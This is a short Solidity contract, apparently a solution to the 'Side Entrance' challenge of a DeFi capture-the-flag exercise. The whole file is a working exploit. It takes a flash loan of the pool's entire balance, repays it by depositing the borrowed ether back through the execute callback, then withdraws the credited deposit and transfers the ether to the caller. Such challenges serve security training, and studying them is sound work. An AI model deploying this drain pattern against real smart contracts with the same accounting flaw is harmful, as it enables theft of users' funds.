// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool private immutable pool;

    // otherwise ether will not come
    receive() external payable {}

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack() external payable {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
